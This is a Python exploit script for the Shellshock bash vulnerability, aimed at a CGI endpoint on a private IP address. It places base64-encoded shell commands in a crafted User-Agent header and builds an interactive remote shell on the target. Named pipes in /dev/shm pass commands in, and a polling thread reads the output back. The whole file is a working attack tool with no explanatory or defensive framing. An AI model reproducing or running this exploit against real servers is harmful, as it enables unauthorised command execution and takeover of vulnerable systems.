import requests
import time
import threading 
from base64 import b64encode
from random import randrange

#Config
global remote_url
remote_url = 'http://192.168.130.203:591/cgi-bin/cat'

class AllTheReads(object):
	"""docstring for AllTheReads"""
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.deamon = True
		thread.start()
	
	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s """ %(stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')

	headers = {
	'User-Agent' : '() { :; }; echo "Content-type: text/html"; echo; export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get(remote_url, headers=headers, timeout=5).text).strip()

	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')

	headers = {
	'User-Agent' : '() { :; }; echo "Content-type: text/html"; echo; export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo "%s" | base64 -d > %s' %(cmd, stdin)
		}
	#print("requests = %s" %(headers))
	result = (requests.get(remote_url, headers=headers, timeout=5).text).strip()

	return result
	

def ReadCmd():
	GetOutput = """/bin/cat %s""" % (stdout)
	output = RunCmd(GetOutput)
	return output

def SetupShell():
	NamedPipes = """mkfifo %s; tail -f  %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout) 
	try:
		RunCmd(NamedPipes)
	except:
		None	
	return None

global link, stdin, stdout, clearoutput	
session = randrange(1000,9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
clearoutput = """echo '' > %s """ %(stdout)

SetupShell()

ReadingTheThings = AllTheReads()

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)